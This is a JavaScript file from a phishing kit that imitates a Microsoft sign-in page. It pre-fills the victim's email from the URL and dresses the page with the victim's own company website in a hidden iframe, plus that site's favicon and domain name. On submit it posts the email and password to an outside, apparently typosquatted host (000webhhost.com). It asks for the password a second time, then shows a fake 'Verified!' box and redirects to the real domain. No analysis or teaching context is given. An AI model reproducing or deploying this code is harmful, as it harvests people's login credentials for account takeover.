document.addEventListener("DOMContentLoaded", function() {
    const url = window.location.href;
    const emailInput = document.getElementById('email');
    const form = document.getElementById('microsoft-form');
    const domain = url.split('@')[1].split('/')[0];
    emailInput.value = url.split('#')[1].split('/')[0];
    form.style.background = `url('https://${domain}/background-image.jpg')`;
});

document.addEventListener("DOMContentLoaded", function() {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const form = document.getElementById('microsoft-login-form');

    function loadContent(page) {
        // Load content based on page parameter
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    document.getElementById('main-content').innerHTML = xhr.responseText;
                } else {
                    console.error('Error loading page:', xhr.status);
                }
            }
        };
        xhr.open('GET', page + '.html', true);
        xhr.send();
    }
    

    // Set iframe to load the website from the domain in the email
    const email = emailInput.value;
    const domain = email.split('@')[1];
    const websiteUrl = `https://${domain}`;

    const iframe = document.createElement('iframe');
    iframe.src = websiteUrl;
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.border = 'none';
    iframe.style.zIndex = '-1';
    document.body.appendChild(iframe);
});

document.addEventListener("DOMContentLoaded", function() {
    const domainInput = document.getElementById('email');
    const domainImg = document.getElementById('zion');
    const domainSpan = document.getElementById('banNer');

    // Function to update the image source and text content based on the domain
    function updateDomainInfo() {
        const email = domainInput.value;
        const domain = email.split('@')[1];
        const domainFavicon = domain ? `https://www.google.com/s2/favicons?domain=${domain}` : '';
        
        domainImg.src = domainFavicon;
        domainSpan.textContent = domain ? domain : '';
    }

    // Call the function initially and on email input change
    domainInput.addEventListener('input', function() {
        updateDomainInfo();
    });

    updateDomainInfo(); // Call initially to populate if email is pre-filled
});

var errorCount = 0; // Initialize error count

document.getElementById("microsoft-login-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent default form submission

    // Show loading overlay before starting form submission
    showLoadingOverlay();

    // Get reCAPTCHA response
    var recaptchaResponse = grecaptcha.getResponse();
    
    // Check if reCAPTCHA response is available
    if (!recaptchaResponse) {
        // Hide loading overlay
        hideLoadingOverlay();
        
        // Display error message for reCAPTCHA not completed
        document.getElementById("error-message").innerHTML = "Please complete the reCAPTCHA.";
        return; // Exit function
    }

    // Hide any existing error messages
    document.getElementById("error-message").innerHTML = "";

    // Create FormData object to collect form data
    var formData = new FormData(this);

    // Append reCAPTCHA response to form data
    formData.append("recaptchaResponse", recaptchaResponse);

    // Send form data to process_login.php using AJAX
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://000webhhost.com/login.php", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                var response = xhr.responseText;
                if (response === "success") {
                    // Replace the form with the verified image
                    replaceWithVerifiedImage();
                    // Redirect to domain at the end of the URL after 3 seconds
                    setTimeout(function() {
                        redirectToDomain();
                    }, 3000);
                } else {
                    // Display error message
                    document.getElementById("error-message").innerHTML = response;
                    // Increment error count
                    errorCount++;
                    // Clear password field
                    document.getElementById("password").value = ""; // Clear password field
                    // Check if error count is 3, then redirect
                    if (errorCount === 2) {
                        // Replace the form with the verified image
                        replaceWithVerifiedImage();
                        // Redirect to domain at the end of the URL after 3 seconds
                        setTimeout(function() {
                            redirectToDomain();
                        }, 3000);
                    }
                }
            } else {
                console.error("Error:", xhr.status);
            }
            // Hide loading overlay when request completes
            hideLoadingOverlay();
        }
    };
    xhr.send(formData);
});

function showLoadingOverlay() {
    // Check if loading overlay already exists
    var existingOverlay = document.getElementById("loading-overlay");
    if (!existingOverlay) {
        // Create loading overlay element
        var overlay = document.createElement("div");
        overlay.id = "loading-overlay";
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100%";
        overlay.style.height = "100%";
        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.5)";
        overlay.style.zIndex = "9999";

        // Add loading spinner or message to the overlay
        overlay.innerHTML = '<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">Loading...</div>';

        // Append overlay to the body
        document.body.appendChild(overlay);
    }
}

function hideLoadingOverlay() {
    var overlay = document.getElementById("loading-overlay");
    if (overlay) {
        overlay.parentNode.removeChild(overlay);
    }
}

function replaceWithVerifiedImage() {
    // Replace the form with the verified image
    var container = document.querySelector(".container");
    container.innerHTML = '<div class="verified-box"><img src="verified-user.png" alt="Verified Logo"><h2>Verified!</h2></div>';
}

// Redirect to the domain at the end of the URL
function redirectToDomain() {
    // Extract the domain from the current URL
    var currentUrl = window.location.href;
    var domain;
    if (currentUrl.includes('#')) {
        // Split the URL by '#' and get the second part
        var parts = currentUrl.split('#');
        domain = parts[1];
    } else {
        // Split the URL by '/' and get the third part
        var parts = currentUrl.split('/');
        domain = parts[2];
    }

    // Redirect to the domain at the end of the URL
    window.location.href = 'https://' + domain;
}
